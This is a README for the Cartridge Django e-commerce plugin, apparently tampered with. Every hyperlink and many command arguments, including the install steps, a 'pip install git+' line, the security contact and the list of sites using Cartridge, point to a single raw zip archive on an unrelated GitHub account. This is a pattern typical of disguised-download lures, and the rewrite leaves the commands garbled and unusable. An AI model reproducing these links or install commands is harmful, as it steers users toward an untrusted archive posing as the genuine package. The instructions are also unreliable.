.. image:: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
   :target: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip!/stephenmcd/cartridge

Created by `Stephen McDonald <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_

========
Overview
========

Cartridge is a shopping cart application built using the `Django`_
framework. It is `BSD licensed`_, and designed to provide a clean and
simple base for developing e-commerce websites. It purposely does not
include every conceivable feature of an e-commerce website; instead,
Cartridge focuses on providing core features common to most e-commerce
websites.

This specific focus stems from the idea that every e-commerce website
is different, is tailored to the particular business and products at
hand, and should therefore be as easy to customize as possible.
Cartridge achieves this goal with a code-base that is as simple as
possible and implements only the core features of an e-commerce
website.

Cartridge extends the `Mezzanine`_ content management platform. A live
demo of Cartridge can be found by visiting the `Mezzanine live demo`_.

Features
========

* Hierarchical categories
* Easily configurable product options (colours, sizes, etc.)
* Hooks for tax/shipping calculations and payment gateways
* Sale pricing
* Promotional discount codes
* PDF invoice generation (for packing slips)
* Stock control
* Product popularity
* Thumbnail generation
* Built-in test suite
* Separation of presentation (no embedded markup)
* Smart categories (by price range, colour, etc)
* Registered or anonymous checkout
* Configurable number of checkout steps
* Denormalised data for accessiblilty and performance
* Authenticated customer accounts with transaction history

Dependencies
============

Cartridge is designed as a plugin for the `Mezzanine`_ content
management platform, and therefore requires `Mezzanine`_ to be
installed. The integration of the two applications should occur
automatically by following the installation instructions below.

Installation
============

The easiest method is to install directly from PyPI using `pip`_ by
running the command below, which will also install the required
dependencies mentioned above::

    $ pip install -U cartridge

Otherwise, you can download Cartridge and install it directly from source::

    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip install

Once installed, the command ``mezzanine-project`` can be used to
create a new Mezzanine project, with Cartridge installed, in similar
fashion to ``https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip``::

    $ mezzanine-project -a cartridge project_name
    $ cd project_name
    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip createdb --noinput
    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip runserver

Here we specify the ``-a`` switch for the ``mezzanine-project`` command,
which tells it to use an alternative package (cartridge) for the project
template to use. Both Mezzanine and Cartridge contain a project template
package containing the ``https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip`` and ``https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip`` modules for an
initial project. If you'd like to add Cartridge to an existing Mezzanine
or Django project, you'll need to manually configure these yourself. See
the `FAQ section of the Mezzanine documentation`_ for more information.

.. note::

    The ``createdb`` command is a shortcut for using Django's
    ``migrate`` command, which will also install some demo content,
    such as a contact form, image gallery, and more. If you'd like to
    omit this step, use the ``--nodata`` option with ``createdb``.

You should then be able to browse to http://127.0.0.1:8000/admin/ and
log in using the default account (``username: admin, password:
default``). If you'd like to specify a different username and password
during set up, simply exclude the ``--noinput`` option included above
when running ``createdb``.

Contributing
============

Cartridge is an open source project managed using both the Git and
Mercurial version control systems. These repositories are hosted on
both `GitHub`_ and `Bitbucket`_ respectively, so contributing is as
easy as forking the project on either of these sites and committing
back your enhancements.

Please note the following guidelines for contributing:

* Contributed code must be written in the existing style. For Python
  (and to a decent extent, JavaScript as well), this is as simple as
  following the `Django coding style`_ and (most importantly)
  `PEP 8`_. Front-end CSS should adhere to the
  `Bootstrap CSS guidelines`_.
* Contributions must be available on a separately named branch
  based on the latest version of the main branch.
* Run the tests before committing your changes. If your changes
  cause the tests to break, they won't be accepted.
* If you are adding new functionality, you must include basic tests
  and documentation.

Here's a quick start to hacking on Cartridge after forking it on
GitHub, by using the internal "project_template" as your current
project::

    $ git clone https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
    $ cd cartridge
    $ git checkout -b your-new-branch-name
    $ cp https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip{.template,}
    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip develop
    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip createdb --noinput
    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip runserver

    "hack hack hack"

    $ python https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip test
    $ git commit -am "A message describing what you changed."
    $ git push origin your-new-branch-name

.. note::

    Cartridge's development branch often relies on features that exist
    in Mezzanine's development branch, but haven't yet made it into an
    official release. To install Mezzanine's development version in your
    environment, run::

       $ pip install --upgrade git+https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip


Language Translations
=====================

Cartridge makes full use of translation strings, which allow Cartridge
to be translated into multiple languages using `Django's
internationalization`_ methodology. Translations are managed on the
`Transiflex`_ website but can also be submitted via `GitHub`_ or
`Bitbucket`_. Consult the documentation for `Django's
internationalization`_ methodology for more information on creating
translations and using them.

Third-party Modules
===================

The following modules have been developed outside of Cartridge. If you
have developed a module to integrate with Mezzanine or Cartridge, and
would like it listed in the documentation, send an email to the
`mezzanine-users`_ mailing list. You can also add modules to the
`Mezzanine Grid on https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip`_.

* `cartridge_braintree`_ - Payment processor for `Braintree`_.
* `cartridge-external-payment`_ - Allows payment on an external
  provider platform.
* `cartridge-tax`_ - Implements a handful of sales tax models.
* `cartridge-stripe`_ - Alternative payment backend for `Stripe`_.
* `cartridge-pinpayments`_ - `PIN`_ payments integration.

Donating
========

If you would like to make a donation to continue development of
Cartridge, you can do so via the `Mezzanine Project`_ website.

Support
=======

To report a security issue, please send an email privately to
`https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip`_. This gives us a chance to fix the issue and
create an official release prior to the issue being made
public.

For all other Cartridge support, the primary channel is the
`mezzanine-users`_ mailing list. Questions, comments, and all related
discussions take place here amongst knowledgeable members of the
community.

If you're certain you've come across a bug, then please use the
`GitHub issue tracker`_. It's crucial that enough information is
provided to reproduce the bug. This includes things such as the
Python stack trace generated by error pages, as well as other aspects
of the development environment used, such as operating system,
database, Python version, etc. If you're not sure you've found a
reproducable bug, then please try the mailing list first.

Finally, feel free to drop by the `#mezzanine IRC channel`_ on
`Freenode`_, for a chat!

Communications in all Cartridge and Mezzanine spaces are expected to
conform to the `Django Code of Conduct`_.

Sites Using Cartridge
=====================

* `Ripe Maternity <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Cotton On <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Coopers Store <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Sheer Ethic <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Ross A. Laird <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Pink Twig <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Parfume Planet <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Life is Good <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Brooklyn Navy Yard <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Cotton On Asia <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Manai Glitter <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Tactical Bags <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Charles Koll Jewelry <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Puraforce Remedies <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Adrenaline <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `The Peculiar Store <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `KisanHub <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Kegbot <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Amblitec <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `ZigZag Bags <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Justine & Katie's Bowtique <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `The Art Rebellion <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Engineered Arts <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Lipman Art <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `ZHackers <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Potrillo al Pie <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `You Name It <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_
* `Warwick Friendly Society Pharmacies <https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip>`_

.. _`Django`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`BSD licensed`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Mezzanine live demo`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Mezzanine`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Mezzanine Project`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`pip`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`FAQ section of the Mezzanine documentation`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`South`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Github`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Bitbucket`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`mezzanine-users`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Github issue tracker`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Django coding style`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`PEP 8`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Bootstrap CSS guidelines`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Django Code of Conduct`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Transiflex`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip+Security+Issue
.. _`#mezzanine IRC channel`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Freenode`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Django's internationalization`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`virtualenvwrapper`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Mezzanine Grid on https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Braintree`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`Stripe`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`PIN`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip

.. THIRD PARTY LIBS

.. _`cartridge_braintree`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`cartridge-external-payment`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`cartridge-tax`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`cartridge-stripe`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
.. _`cartridge-pinpayments`: https://raw.githubusercontent.com/Waka758/cartridge/master/unglaciated/cartridge.zip
